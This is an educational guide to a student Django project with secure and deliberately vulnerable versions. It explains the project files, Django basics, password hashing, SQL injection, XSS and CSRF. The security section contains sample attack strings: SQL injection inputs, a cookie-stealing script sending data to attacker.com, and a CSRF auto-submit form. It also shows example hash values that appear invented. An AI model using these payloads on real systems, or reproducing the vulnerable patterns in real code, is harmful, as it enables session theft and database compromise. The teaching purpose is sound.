# Complete Guide - Communication_LTD Cyber Security Project

## Table of Contents
1. [Project Overview](#project-overview)
2. [What is Django?](#what-is-django)
3. [Project Structure Explained](#project-structure-explained)
4. [Every File Explained](#every-file-explained)
5. [Django Concepts Explained](#django-concepts-explained)
6. [Security Concepts Explained](#security-concepts-explained)
7. [How the Code Works](#how-the-code-works)
8. [Vulnerable vs Secure Versions](#vulnerable-vs-secure-versions)

---

## Project Overview

This is a **web application** built for a fictional telecommunications company called "Communication_LTD". The project demonstrates:

- **Secure development practices** (Part A)
- **Security vulnerabilities** and how to exploit them (Part B - Vulnerable version)
- **Security protections** and how to defend against attacks (Part B - Secure version)

### What Does This Application Do?

The application allows users to:
1. **Register** a new account with a strong password
2. **Login** to the system
3. **Add and view clients** (customer database)
4. **Change password** while logged in
5. **Reset password** if forgotten (via email verification code)

### Technologies Used

- **Python** - Programming language
- **Django** - Web framework (like a toolkit for building websites)
- **SQLite** - Database (stores all data)
- **HTML/CSS** - User interface (what you see in the browser)

---

## What is Django?

### Simple Explanation

Django is a **framework** - think of it like a construction kit for building websites. Instead of building everything from scratch, Django provides:

- **Pre-built components** for common tasks (user login, database access, forms)
- **Security features** built-in (CSRF protection, SQL injection prevention)
- **Structure** that organizes your code

### How Django Works - The MVC Pattern

Django uses an architecture called **MVT** (Model-View-Template):

```
┌─────────────┐
│   Browser   │ ← User sees this
└──────┬──────┘
       │
       ↓ HTTP Request (user clicks button)
┌─────────────┐
│   URLs      │ ← Routes request to correct View
└──────┬──────┘
       │
       ↓
┌─────────────┐
│   View      │ ← Business logic (Python code)
└──────┬──────┘
       │
       ↓
┌─────────────┐
│   Model     │ ← Database access
└──────┬──────┘
       │
       ↓
┌─────────────┐
│  Database   │ ← Stores data
└──────┬──────┘
       │
       ↓ Returns data
┌─────────────┐
│   View      │ ← Processes data
└──────┬──────┘
       │
       ↓
┌─────────────┐
│  Template   │ ← HTML file with data inserted
└──────┬──────┘
       │
       ↓ HTTP Response (HTML page)
┌─────────────┐
│   Browser   │ ← User sees result
└─────────────┘
```

**Example:**
1. User clicks "Login" button
2. Request goes to `/login/` URL
3. URLs file routes it to `login_view()` function
4. `login_view()` checks username/password in database
5. If correct, renders `login.html` template
6. Browser displays the page

---

## Project Structure Explained

We have **TWO separate folders** - identical projects but with different security levels:

### Folder Structure

```
computer_security_project/
│
├── project_secure/              ← SECURE VERSION (Part B - with protections)
│   ├── Communication_LTD/       ← Main application
│   │   ├── migrations/          ← Database schema changes
│   │   ├── static/              ← CSS, images, JavaScript
│   │   ├── templates/           ← HTML files
│   │   ├── __init__.py          ← Makes this a Python package
│   │   ├── admin.py             ← Admin panel configuration
│   │   ├── apps.py              ← App configuration
│   │   ├── models.py            ← Database structure
│   │   ├── tests.py             ← Unit tests
│   │   ├── urls.py              ← URL routing for this app
│   │   ├── utils.py             ← Helper functions
│   │   └── views.py             ← Business logic (SECURE)
│   │
│   ├── config/                  ← Project configuration
│   │   ├── __init__.py
│   │   ├── settings.py          ← Main configuration file
│   │   ├── urls.py              ← Main URL routing
│   │   ├── wsgi.py              ← Web server interface
│   │   └── asgi.py              ← Async server interface
│   │
│   ├── manage.py                ← Django command-line tool
│   ├── requirements.txt         ← Python dependencies
│   ├── passwordConfig.json      ← Password policy rules
│   ├── common_passwords.txt     ← Blocked passwords list
│   └── db.sqlite3               ← Database (created when you run migrations)
│
└── project_vulnerable/          ← VULNERABLE VERSION (Part B - with intentional flaws)
    └── (same structure as above)
```

### Key Differences Between Two Versions

| Feature | Secure Version | Vulnerable Version |
|---------|---------------|-------------------|
| **SQL Queries** | Uses Django ORM (safe) | Uses raw SQL (unsafe) |
| **User Input** | Sanitized with `escape()` | Not sanitized |
| **Dashboard Template** | Auto-escapes HTML | Uses `\| safe` filter |
| **Purpose** | Real-world use | Educational demonstration |

---

## Every File Explained

### Do We Need This File?

Let me explain **every file** and whether it's necessary:

### ✅ **ESSENTIAL FILES** (Cannot delete)

#### **1. manage.py**
**What it is:** Django's command-line utility
**What it does:** Runs commands like starting the server, creating database tables
**Can we delete?** ❌ NO - This is how you control the entire project

**How to use:**
```bash
python manage.py runserver      # Start web server
python manage.py migrate         # Create database tables
python manage.py createsuperuser # Create admin account
```

**Code explanation:**
```python
#!/usr/bin/env python
import os
import sys

def main():
    # Tell Django where settings are
    os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'config.settings')

    # Import Django's command runner
    from django.core.management import execute_from_command_line

    # Execute the command
    execute_from_command_line(sys.argv)

if __name__ == '__main__':
    main()
```

---

#### **2. config/settings.py**
**What it is:** Main configuration file
**What it does:** Controls everything about your Django project
**Can we delete?** ❌ NO - Required for Django to work

**Important settings explained:**

```python
# SECRET_KEY - Used for cryptographic signing
# Keep this secret! Change it in production
SECRET_KEY = 'django-insecure-b0vn#@...'

# DEBUG - Shows detailed error pages
# ALWAYS set to False in production!
DEBUG = True

# ALLOWED_HOSTS - Which domains can access this site
# Empty list = only localhost in debug mode
ALLOWED_HOSTS = []

# INSTALLED_APPS - List of all apps Django should load
INSTALLED_APPS = [
    'django.contrib.admin',        # Admin interface at /admin/
    'django.contrib.auth',         # Authentication system
    'django.contrib.contenttypes', # Content type framework
    'django.contrib.sessions',     # Session management (remember logged-in users)
    'django.contrib.messages',     # One-time messages (success/error notifications)
    'django.contrib.staticfiles',  # Manage static files (CSS, images)
    'Communication_LTD',           # OUR APP!
]

# MIDDLEWARE - Processing layers for requests/responses
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',      # Security headers
    'django.contrib.sessions.middleware.SessionMiddleware', # Handle sessions
    'django.middleware.common.CommonMiddleware',          # Common operations
    'django.middleware.csrf.CsrfViewMiddleware',          # CSRF protection
    'django.contrib.auth.middleware.AuthenticationMiddleware', # User authentication
    'django.contrib.messages.middleware.MessageMiddleware',    # Messages framework
    'django.middleware.clickjacking.XFrameOptionsMiddleware',  # Clickjacking protection
]

# DATABASES - Where to store data
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.sqlite3',  # Database type
        'NAME': BASE_DIR / 'db.sqlite3',         # Database file location
    }
}

# EMAIL - How to send emails
EMAIL_BACKEND = "django.core.mail.backends.filebased.EmailBackend"
EMAIL_FILE_PATH = BASE_DIR / "sent_emails"  # Save emails as files (for development)

# TEMPLATES - HTML file configuration
TEMPLATES = [
    {
        'BACKEND': 'django.template.backends.django.DjangoTemplates',
        'DIRS': [BASE_DIR / 'Communication_LTD' / 'templates'],  # Where to find templates
        'APP_DIRS': True,  # Look for templates in each app's template folder
        'OPTIONS': {
            'context_processors': [
                'django.template.context_processors.request',  # Access request in templates
                'django.contrib.auth.context_processors.auth', # Access user info
                'django.contrib.messages.context_processors.messages', # Access messages
            ],
        },
    },
]
```

---

#### **3. config/urls.py**
**What it is:** Main URL routing file
**What it does:** Maps URLs to views (which Python function handles which URL)
**Can we delete?** ❌ NO - Django needs this to know where to send requests

**Code explanation:**
```python
from django.contrib import admin
from django.urls import path, include

urlpatterns = [
    # /admin/ goes to Django's built-in admin panel
    path('admin/', admin.site.urls),

    # All other URLs go to Communication_LTD app's urls.py
    # include() means "use the URL patterns from that app"
    path('', include('Communication_LTD.urls')),
]
```

**Example:**
- User visits: `http://127.0.0.1:8000/admin/` → Django admin
- User visits: `http://127.0.0.1:8000/login/` → Goes to `Communication_LTD/urls.py`

---

#### **4. Communication_LTD/models.py**
**What it is:** Database structure definition
**What it does:** Defines tables and their columns (like designing an Excel spreadsheet)
**Can we delete?** ❌ NO - This is your database schema

**Full code explained:**

```python
from django.db import models
from django.utils import timezone

# MODEL #1: User
# This creates a table called "Communication_LTD_user"
class User(models.Model):
    # username field - text, max 100 characters, must be unique
    username = models.CharField(max_length=100, unique=True)

    # email field - text, max 255 characters, must be unique
    email = models.CharField(max_length=255, unique=True)

    # password_hash - stores encrypted password (NOT the actual password!)
    password_hash = models.CharField(max_length=255)

    # salt - random value used in password encryption
    salt = models.CharField(max_length=255)

    # failed_login_attempts - counter for wrong password attempts
    # default=0 means starts at zero
    failed_login_attempts = models.IntegerField(default=0)

    # is_locked - boolean (True/False), default is False
    # True = account is locked after too many failed logins
    is_locked = models.BooleanField(default=False)

    # __str__ method - how to display this object as a string
    def __str__(self):
        return self.username  # When you print(user), shows the username


# MODEL #2: PasswordHistory
# Stores previous passwords so users can't reuse them
class PasswordHistory(models.Model):
    # ForeignKey = link to another table
    # This links to the User table
    # on_delete=models.CASCADE means: if user is deleted, delete their password history too
    # related_name='password_history' lets us access this from User: user.password_history.all()
    user = models.ForeignKey(User, on_delete=models.CASCADE, related_name='password_history')

    # Old password hash
    password_hash = models.CharField(max_length=255)

    # Old password salt
    salt = models.CharField(max_length=255)

    # When was this password created?
    # auto_now_add=True means automatically set to current time when record is created
    created_at = models.DateTimeField(auto_now_add=True)

    # Meta class - additional options for this model
    class Meta:
        # ordering - how to sort results by default
        # ['-created_at'] means newest first (minus sign = descending order)
        ordering = ['-created_at']


# MODEL #3: Client
# Stores customer/client information
class Client(models.Model):
    name = models.CharField(max_length=100)           # Client name
    email = models.EmailField(null=True, blank=True)  # null=True, blank=True = optional field
    phone = models.CharField(max_length=15)           # Phone number

    def __str__(self):
        return self.name


# MODEL #4: ResetCode
# Stores password reset verification codes
class ResetCode(models.Model):
    # username - who requested the reset
    username = models.CharField(max_length=100, unique=True)

    # code_hash - the verification code, hashed with SHA-1 (40 characters)
    code_hash = models.CharField(max_length=40)

    # When was this code created?
    created_at = models.DateTimeField(auto_now_add=True)
```

**What happens in the database:**

These models create actual database tables:

**User Table:**
| id | username | email | password_hash | salt | failed_login_attempts | is_locked |
|----|----------|-------|--------------|------|---------------------|-----------|
| 1 | john | john@email.com | a3f2b1... | e4d9c8... | 0 | False |
| 2 | sarah | sarah@email.com | k9j8h7... | q5w6e7... | 2 | False |

**PasswordHistory Table:**
| id | user_id | password_hash | salt | created_at |
|----|---------|--------------|------|------------|
| 1 | 1 | x7y8z9... | r4t5y6... | 2024-01-15 10:30:00 |
| 2 | 1 | a3f2b1... | e4d9c8... | 2024-01-16 14:20:00 |

---

#### **5. Communication_LTD/views.py**
**What it is:** Business logic / "Brain" of the application
**What it does:** Handles all user actions (login, register, add client, etc.)
**Can we delete?** ❌ NO - This is the core functionality

**I'll explain this file in detail in the "How the Code Works" section below.**

---

#### **6. Communication_LTD/urls.py**
**What it is:** URL routing for the Communication_LTD app
**What it does:** Maps URLs to view functions
**Can we delete?** ❌ NO - Tells Django which function handles which URL

**Code explained:**
```python
from django.urls import path
from Communication_LTD import views

urlpatterns = [
    # path(URL pattern, view function, name)
    # name is used in templates: {% url 'login' %}

    path('', views.login_view, name='login'),
    # '' = homepage (http://127.0.0.1:8000/)
    # Calls: views.login_view()

    path('register/', views.register_view, name='register'),
    # http://127.0.0.1:8000/register/

    path('dashboard/', views.dashboard_view, name='dashboard'),
    # http://127.0.0.1:8000/dashboard/

    path('forgot_password/', views.forgot_password_view, name='forgot_password'),
    path('verify/', views.verify_code_view, name='verify'),
    path('reset_password/', views.reset_password_view, name='reset_password'),
    path('change_password/', views.change_password_view, name='change_password'),
    path('logout/', views.logout_view, name='logout'),
]
```

**Flow example:**
1. User visits: `http://127.0.0.1:8000/register/`
2. Django looks in `config/urls.py` → finds `include('Communication_LTD.urls')`
3. Django looks in `Communication_LTD/urls.py` → finds `path('register/', views.register_view)`
4. Django calls `views.register_view()` function
5. Function returns HTML response
6. User sees registration page

---

#### **7. Communication_LTD/utils.py**
**What it is:** Helper functions (toolkit)
**What it does:** Reusable functions used by views.py
**Can we delete?** ❌ NO - Contains critical password validation and encryption

**I'll explain this in detail in "How the Code Works" section.**

---

#### **8. templates/*.html**
**What they are:** HTML files (what users see)
**What they do:** Display information to users
**Can we delete?** ❌ NO - These are the user interface

**We need ALL template files:**
- `login.html` - Login form
- `register.html` - Registration form
- `dashboard.html` - Main page after login
- `change_password.html` - Change password form
- `forgot_password.html` - Request password reset
- `verify.html` - Enter verification code
- `reset_password.html` - Set new password after verification

---

#### **9. static/allforms.css**
**What it is:** Styling file (makes pages look nice)
**What it does:** Colors, fonts, layouts
**Can we delete?** ⚠️ OPTIONAL - Page will work but look ugly without it

---

#### **10. migrations/ folder**
**What it is:** Database change history
**What it does:** Tracks changes to your database structure
**Can we delete?** ❌ NO (but can delete contents and recreate)

**What are migrations?**

When you change `models.py` (add a field, create a new model), Django needs to update the database. Migrations are like "recipes" for those changes.

**Example:**
1. You add `is_locked` field to User model
2. Run: `python manage.py makemigrations`
   - Django creates: `migrations/0002_add_is_locked_field.py`
   - This file contains Python code to add the column
3. Run: `python manage.py migrate`
   - Django reads that file and adds the column to database

**Files in migrations/:**
- `__init__.py` - Makes it a Python package (empty file, required)
- `0001_initial.py` - First migration (creates all tables)
- `0002_xxx.py` - Second migration (some change)
- etc.

**Can we delete these?**
- If starting fresh: Delete all except `__init__.py`, then run `makemigrations` and `migrate`
- If database exists: Don't delete - you'll have migration conflicts

---

### ✅ **CONFIGURATION FILES** (Essential)

#### **11. passwordConfig.json**
**What it is:** Password policy configuration
**What it does:** Defines password requirements
**Can we delete?** ❌ NO - Required by assignment, used by utils.py

```json
{
    "min_length": 10,              // Password must be at least 10 characters
    "complexity": {
        "uppercase": true,         // Must contain A-Z
        "lowercase": true,         // Must contain a-z
        "digits": true,            // Must contain 0-9
        "special": true            // Must contain !@#$%^&*
    },
    "history_count": 3,            // Remember last 3 passwords
    "max_failed_logins": 3,        // Lock account after 3 wrong passwords
    "prevent_reuse": true          // Don't allow reusing old passwords
}
```

**Why JSON format?**
- Easy to read and edit
- System admin can change rules without touching Python code
- Separates configuration from code (good practice)

---

#### **12. common_passwords.txt**
**What it is:** List of banned passwords
**What it does:** Prevents users from choosing weak passwords
**Can we delete?** ⚠️ OPTIONAL - But password dictionary check won't work

**Example contents:**
```
password
123456
qwerty
letmein
admin
```

---

#### **13. requirements.txt**
**What it is:** List of Python libraries needed
**What it does:** Tells others what to install
**Can we delete?** ⚠️ OPTIONAL - But good practice to have

**Contents:**
```
Django>=5.0,<6.0
```

**How to use:**
```bash
pip install -r requirements.txt
```

---

### ❓ **OPTIONAL/STANDARD FILES**

#### **14. admin.py**
**What it is:** Admin panel configuration
**What it does:** Lets you manage database through web interface
**Can we delete?** ⚠️ OPTIONAL - But you lose admin panel

**Currently empty:**
```python
from django.contrib import admin
# Register your models here.
```

**Could add:**
```python
from django.contrib import admin
from .models import User, Client, PasswordHistory, ResetCode

admin.site.register(User)
admin.site.register(Client)
admin.site.register(PasswordHistory)
admin.site.register(ResetCode)
```

Then visit `http://127.0.0.1:8000/admin/` to manage database visually.

---

#### **15. apps.py**
**What it is:** App configuration
**What it does:** Tells Django about this app
**Can we delete?** ❌ NO - Django requires this

```python
from django.apps import AppConfig

class CommunicationLtdConfig(AppConfig):
    # Type of primary key to use for models
    default_auto_field = 'django.db.models.BigAutoField'

    # Name of the app (must match folder name)
    name = 'Communication_LTD'
```

---

#### **16. tests.py**
**What it is:** Unit tests
**What it does:** Automated testing
**Can we delete?** ⚠️ OPTIONAL - Currently empty

---

#### **17. __init__.py**
**What it is:** Python package marker
**What it does:** Makes folder a Python package
**Can we delete?** ❌ NO - Required for imports to work

Usually empty. Its presence tells Python: "This folder is a package."

---

#### **18. wsgi.py and asgi.py**
**What they are:** Web server interfaces
**What they do:** Connect Django to web servers (production deployment)
**Can we delete?** ⚠️ OPTIONAL for development - Required for production

---

## Django Concepts Explained

### 1. What is a Model?

**Simple definition:** A model is a Python class that represents a database table.

**Think of it like Excel:**
- **Model** = Worksheet (e.g., "Customers")
- **Model Fields** = Columns (e.g., "Name", "Email", "Phone")
- **Model Instance** = Row (e.g., one specific customer)

**Example:**

```python
class User(models.Model):
    username = models.CharField(max_length=100)
    email = models.EmailField()
```

This creates:

| id | username | email |
|----|----------|-------|
| 1 | john | john@email.com |
| 2 | sarah | sarah@email.com |

**How to use in code:**

```python
# CREATE a new user
user = User.objects.create(
    username="john",
    email="john@email.com"
)

# READ a user
user = User.objects.get(username="john")

# UPDATE a user
user.email = "newemail@email.com"
user.save()

# DELETE a user
user.delete()

# LIST all users
all_users = User.objects.all()

# FILTER users
johns = User.objects.filter(username__contains="john")
```

---

### 2. What is a View?

**Simple definition:** A view is a Python function that receives a web request and returns a web response.

**Think of it like:**
- **User action** (click button) → **View function** → **Response** (show page)

**Example:**

```python
def login_view(request):
    if request.method == "POST":
        # User submitted the form
        username = request.POST.get("username")
        password = request.POST.get("password")

        # Check if valid
        if is_valid(username, password):
            return redirect("dashboard")  # Go to dashboard
        else:
            return render(request, "login.html", {"error": "Invalid credentials"})
    else:
        # User just opened the page
        return render(request, "login.html")
```

**Flow:**
1. User visits `/login/` → Django calls `login_view(request)`
2. If GET request (just opening page) → Show login form
3. If POST request (submitting form) → Check credentials
4. If valid → Redirect to dashboard
5. If invalid → Show error message

---

### 3. What is a Template?

**Simple definition:** A template is an HTML file with special syntax to insert dynamic data.

**Example template:**

```html
<h1>Welcome, {{ username }}!</h1>

{% if is_admin %}
    <p>You are an admin.</p>
{% endif %}

{% for client in clients %}
    <li>{{ client.name }}</li>
{% endfor %}
```

**Django template syntax:**
- `{{ variable }}` - Insert value
- `{% if condition %}` - Conditional
- `{% for item in list %}` - Loop
- `{% url 'name' %}` - Generate URL

---

### 4. What is ORM?

**ORM = Object-Relational Mapping**

**Simple definition:** Converts Python code to SQL automatically.

**Instead of writing SQL:**
```sql
SELECT * FROM Communication_LTD_user WHERE username = 'john';
```

**You write Python:**
```python
user = User.objects.get(username='john')
```

Django converts this to SQL behind the scenes.

**Why is this important for security?**
- ORM automatically escapes special characters
- Prevents SQL injection attacks
- Safer than writing raw SQL

---

### 5. What is a Session?

**Simple definition:** A way to remember information about a user across multiple page visits.

**Example:**
1. User logs in
2. Server saves: `session['username'] = 'john'`
3. User visits dashboard (different page)
4. Server checks: `if 'username' in session:` - still logged in!
5. User closes browser
6. Session is destroyed - must log in again

**How it works:**
- Server creates a unique session ID
- Stores in cookie in user's browser
- Server looks up session data using that ID

---

### 6. What are Migrations?

**Simple definition:** A history of database changes.

**Example scenario:**

**Day 1:** Create User model
```python
class User(models.Model):
    username = models.CharField(max_length=100)
    email = models.EmailField()
```

Run: `python manage.py makemigrations`
- Creates: `0001_initial.py`
- Contains code to create `user` table with 2 columns

Run: `python manage.py migrate`
- Executes that migration
- Table is created in database

**Day 2:** Add password field
```python
class User(models.Model):
    username = models.CharField(max_length=100)
    email = models.EmailField()
    password_hash = models.CharField(max_length=255)  # NEW!
```

Run: `python manage.py makemigrations`
- Creates: `0002_add_password_hash.py`
- Contains code to add column

Run: `python manage.py migrate`
- Adds the new column
- Existing data is preserved

**Why migrations?**
- Track database changes
- Apply changes safely
- Can rollback if needed
- Team members can sync database structure

---

## Security Concepts Explained

### 1. What is SQL Injection (SQLi)?

**Simple definition:** An attack where a hacker inserts malicious SQL code into your application's inputs.

**How it works:**

**Vulnerable code:**
```python
query = f"SELECT * FROM users WHERE username = '{username}'"
cursor.execute(query)
```

**Normal use:**
- User enters username: `john`
- SQL becomes: `SELECT * FROM users WHERE username = 'john'`
- ✅ Works correctly

**Attack:**
- Hacker enters username: `admin' OR '1'='1`
- SQL becomes: `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`
- `'1'='1'` is always true
- ❌ Returns ALL users, bypasses authentication!

**More dangerous attack:**
- Hacker enters: `'; DROP TABLE users; --`
- SQL becomes: `SELECT * FROM users WHERE username = ''; DROP TABLE users; --'`
- ❌ Deletes entire users table!

**How to prevent:**
1. **Use Django ORM** (parameterized queries)
```python
user = User.objects.get(username=username)
# Django automatically escapes special characters
```

2. **Use parameterized queries if using raw SQL**
```python
cursor.execute("SELECT * FROM users WHERE username = ?", [username])
```

---

### 2. What is Cross-Site Scripting (XSS)?

**Simple definition:** An attack where a hacker injects malicious JavaScript into your website.

**How it works:**

**Vulnerable code:**
```python
# View
client_name = request.POST.get("client_name")
Client.objects.create(name=client_name)  # Save without sanitizing

# Template
<li>{{ client.name | safe }}</li>  # Displays without escaping
```

**Normal use:**
- User enters name: `Acme Corp`
- Displays: `<li>Acme Corp</li>`
- ✅ Works correctly

**Attack (Stored XSS):**
- Hacker enters name: `<script>alert('Hacked!')</script>`
- Saved to database: `<script>alert('Hacked!')</script>`
- When displayed: `<li><script>alert('Hacked!')</script></li>`
- ❌ JavaScript runs in everyone's browser!

**Dangerous XSS attacks:**
1. **Cookie stealing:**
```javascript
<script>
  fetch('http://attacker.com?cookie=' + document.cookie)
</script>
```

2. **Redirect to phishing site:**
```javascript
<script>
  window.location = 'http://fake-bank.com'
</script>
```

3. **Modify page content:**
```javascript
<script>
  document.body.innerHTML = 'This site has been hacked!'
</script>
```

**How to prevent:**
1. **Sanitize input (encode special characters)**
```python
from django.utils.html import escape
client_name = escape(request.POST.get("client_name"))
# <script> becomes &lt;script&gt; (displayed as text, not executed)
```

2. **Don't use `| safe` in templates** (unless you trust the data)
```html
<!-- GOOD: Auto-escapes -->
<li>{{ client.name }}</li>

<!-- BAD: Doesn't escape -->
<li>{{ client.name | safe }}</li>
```

---

### 3. What is HMAC?

**HMAC = Hash-based Message Authentication Code**

**Simple definition:** A way to securely hash a password using a secret key.

**How it works:**

```python
import hmac
import hashlib

# Inputs
password = "MyPassword123!"
salt = "random_value_abc123"  # The "secret key"

# HMAC process
hashed = hmac.new(
    salt.encode(),          # Key
    password.encode(),      # Message
    hashlib.sha256          # Hash algorithm
).hexdigest()

# Result: "a3f2b1c4d5e6f7g8h9..."
```

**Why HMAC instead of regular hashing?**

| Method | Security |
|--------|----------|
| `hash(password)` | ❌ Weak - same password = same hash |
| `hash(password + salt)` | ⚠️ Better - but vulnerable to length extension attacks |
| `hmac(salt, password)` | ✅ Best - cryptographically secure |

**Analogy:**
- **Hash** = Blending ingredients (can't un-blend)
- **HMAC** = Blending ingredients with a secret recipe (even harder to reverse)

---

### 4. What is Salt?

**Simple definition:** A random value added to each password before hashing.

**Why do we need salt?**

**Without salt:**
```
hash("password123") = "482c811da5d5b4bc6d497ffa98491e38"
hash("password123") = "482c811da5d5b4bc6d497ffa98491e38"  # Same!
```

- If two users have same password, hashes are identical
- Attacker can use **rainbow tables** (pre-computed hash databases)
- Attacker cracks one password = cracks all identical passwords

**With salt:**
```
user1: hash("password123" + "salt_abc") = "a3f2b1c4..."
user2: hash("password123" + "salt_xyz") = "k9j8h7g6..."  # Different!
```

- Each user has unique salt
- Same password = different hash
- Rainbow tables don't work
- Attacker must crack each password individually

**How we use it:**

```python
import os

# Register new user
salt = os.urandom(16).hex()  # Generate random salt
hashed = hmac.new(salt.encode(), password.encode(), hashlib.sha256).hexdigest()

# Save to database
user = User.objects.create(
    username=username,
    password_hash=hashed,
    salt=salt  # Save salt too!
)

# Login - verify password
user = User.objects.get(username=username)
hashed_input = hmac.new(user.salt.encode(), password.encode(), hashlib.sha256).hexdigest()

if hashed_input == user.password_hash:
    # Password correct!
```

**In database:**
| username | password_hash | salt |
|----------|--------------|------|
| john | a3f2b1c4d5e6... | abc123... |
| sarah | k9j8h7g6f5e4... | xyz789... |

Even if attacker steals database, can't reverse the hashes.

---

### 5. What is SHA-1?

**SHA-1 = Secure Hash Algorithm 1**

**Simple definition:** A hash function that converts any input into a 40-character hexadecimal string.

**Example:**
```python
import hashlib

code = "ABC123"
hashed = hashlib.sha1(code.encode()).hexdigest()
# Result: "8c291d2a4024709b4b8e4c3f4c9c3e3f8f8c3e3f" (40 characters)
```

**Properties:**
- Always same output for same input
- Cannot reverse (one-way function)
- Small change in input = completely different output

```python
hashlib.sha1("ABC123".encode()).hexdigest()
# "8c291d2a4024709b4b8e4c3f4c9c3e3f8f8c3e3f"

hashlib.sha1("ABC124".encode()).hexdigest()  # Changed last character
# "f7c3bc1d808e04732adf679965ccc34ca7ae3441"  # Completely different!
```

**Why SHA-1 for verification codes in this project?**
- Assignment requirement
- Codes are temporary (short-lived)
- Not for passwords (we use HMAC+SHA256 for passwords)

**Note:** SHA-1 is considered weak for passwords. Modern apps use:
- **bcrypt** - Designed for passwords
- **Argon2** - Winner of password hashing competition
- **PBKDF2** - Slow hashing (good for passwords)

---

### 6. What is CSRF?

**CSRF = Cross-Site Request Forgery**

**Simple definition:** An attack where a malicious website tricks your browser into making requests to another website where you're logged in.

**How it works:**

1. You're logged in to `yourbank.com`
2. You visit `evil.com` (malicious site)
3. `evil.com` has this code:
```html
<form action="https://yourbank.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```
4. Your browser automatically sends your cookies to `yourbank.com`
5. ❌ Money transferred without your knowledge!

**How Django prevents CSRF:**

Every form must include a CSRF token:
```html
<form method="POST">
    {% csrf_token %}  <!-- Django generates unique token -->
    <input name="username">
    <button>Submit</button>
</form>
```

- Django generates a secret token for each session
- Token is included in every form
- When form is submitted, Django checks: "Does this token match the session?"
- If no token or wrong token → Request rejected
- Evil site can't get your token → Attack fails

---

## How the Code Works

Let me explain the key Python files with detailed code explanations.

### utils.py - Helper Functions

```python
import hashlib
import hmac
import os
import json
from django.conf import settings

# FUNCTION 1: Load password rules from JSON file
def load_password_rules():
    # Get path to passwordConfig.json
    config_path = settings.BASE_DIR / "passwordConfig.json"

    # Open and read the file
    with open(config_path, "r") as f:
        return json.load(f)  # Parse JSON and return as dictionary


# FUNCTION 2: Load common passwords from text file
def load_common_passwords():
    """
    Reads common_passwords.txt and returns list of banned passwords
    """
    dict_path = settings.BASE_DIR / "common_passwords.txt"
    try:
        with open(dict_path, "r") as f:
            # Read each line, remove whitespace, convert to lowercase
            return [line.strip().lower() for line in f if line.strip()]
    except FileNotFoundError:
        return []  # If file doesn't exist, return empty list


# FUNCTION 3: Check if password meets all requirements
def check_password_rules(password, user=None):
    """
    Validates password against all rules

    Args:
        password: The password to check
        user: Optional - User object to check password history

    Returns:
        (True, "OK") if valid
        (False, "error message") if invalid
    """

    # Load rules from JSON file
    rules = load_password_rules()

    # CHECK 1: Minimum length
    if len(password) < rules["min_length"]:
        return False, f"Password must be at least {rules['min_length']} characters"

    # CHECK 2: Must contain uppercase letter (A-Z)
    if rules["complexity"]["uppercase"]:
        # any() returns True if at least one character is uppercase
        if not any(c.isupper() for c in password):
            return False, "Password must include uppercase letter"

    # CHECK 3: Must contain lowercase letter (a-z)
    if rules["complexity"]["lowercase"]:
        if not any(c.islower() for c in password):
            return False, "Password must include lowercase letter"

    # CHECK 4: Must contain digit (0-9)
    if rules["complexity"]["digits"]:
        if not any(c.isdigit() for c in password):
            return False, "Password must include a digit"

    # CHECK 5: Must contain special character
    if rules["complexity"]["special"]:
        special_chars = "!@#$%^&*()-_=+{}[]"
        if not any(c in special_chars for c in password):
            return False, "Password must include special character"

    # CHECK 6: Not in common passwords dictionary
    common_passwords = load_common_passwords()
    if password.lower() in common_passwords:
        return False, "Password is too common. Please choose a stronger password"

    # CHECK 7: Not in password history (if user provided)
    if user and rules.get("prevent_reuse", False):
        from .models import PasswordHistory

        # Get how many passwords to remember
        history_count = rules.get("history_count", 3)

        # Get last N passwords from database
        # order_by('-created_at') = newest first
        # [:history_count] = limit to first N results
        previous_passwords = PasswordHistory.objects.filter(
            user=user
        ).order_by('-created_at')[:history_count]

        # Check if new password matches any old password
        for prev in previous_passwords:
            # Hash the new password with old salt
            prev_hash, _ = hash_password(password, prev.salt)

            # Compare hashes
            if prev_hash == prev.password_hash:
                return False, f"Password was used recently. Cannot reuse last {history_count} passwords"

    # All checks passed!
    return True, "OK"


# FUNCTION 4: Hash password with HMAC + Salt
def hash_password(password, salt=None):
    """
    Encrypts password using HMAC + SHA256

    Args:
        password: Plain text password
        salt: Optional - if not provided, generates new random salt

    Returns:
        (hashed_password, salt) - tuple of two strings
    """

    # If no salt provided, generate random one
    if salt is None:
        # os.urandom(16) = 16 random bytes
        # .hex() = convert to hexadecimal string (32 characters)
        salt = os.urandom(16).hex()

    # HMAC encryption
    hashed = hmac.new(
        salt.encode(),        # Key (convert string to bytes)
        password.encode(),    # Message (convert string to bytes)
        hashlib.sha256        # Hash algorithm
    ).hexdigest()             # Convert result to hexadecimal string

    return hashed, salt


# FUNCTION 5: Hash verification code with SHA-1
def hash_code(code):
    """
    Hashes verification code using SHA-1
    Used for password reset codes
    """
    return hashlib.sha1(code.encode()).hexdigest()
```

---

### views.py - Business Logic (Secure Version)

I'll explain the most important views:

```python
from django.shortcuts import render, redirect
from django.contrib import messages
from django.db.models import Q
from .models import User, Client, ResetCode, PasswordHistory
from .utils import check_password_rules, hash_password, hash_code, load_password_rules
from django.core.mail import send_mail
from django.conf import settings
import secrets
import hashlib
from django.utils.html import escape


# VIEW 1: LOGIN
def login_view(request):
    """
    Handles user login

    GET request: Show login form
    POST request: Process login attempt
    """

    # Check if form was submitted
    if request.method == "POST":
        # Get data from form
        username = request.POST.get("username")
        password = request.POST.get("password")

        # STEP 1: Check if user exists
        try:
            user = User.objects.get(username=username)
            # Django ORM: SELECT * FROM users WHERE username = ?
            # This is SAFE - Django escapes special characters
        except User.DoesNotExist:
            messages.error(request, "User not found")
            return redirect("login")

        # STEP 2: Check if account is locked
        rules = load_password_rules()
        max_attempts = rules.get("max_failed_logins", 3)

        if user.is_locked:
            messages.error(request, f"Account locked due to {max_attempts} failed login attempts.")
            return redirect("login")

        # STEP 3: Hash the entered password
        hashed, _ = hash_password(password, user.salt)
        # Uses the user's stored salt to hash the input

        # STEP 4: Compare hashes
        if hashed != user.password_hash:
            # WRONG PASSWORD

            # Increment failed attempts counter
            user.failed_login_attempts += 1

            # Check if should lock account
            if user.failed_login_attempts >= max_attempts:
                user.is_locked = True
                user.save()
                messages.error(request, f"Account locked due to {max_attempts} failed login attempts.")
            else:
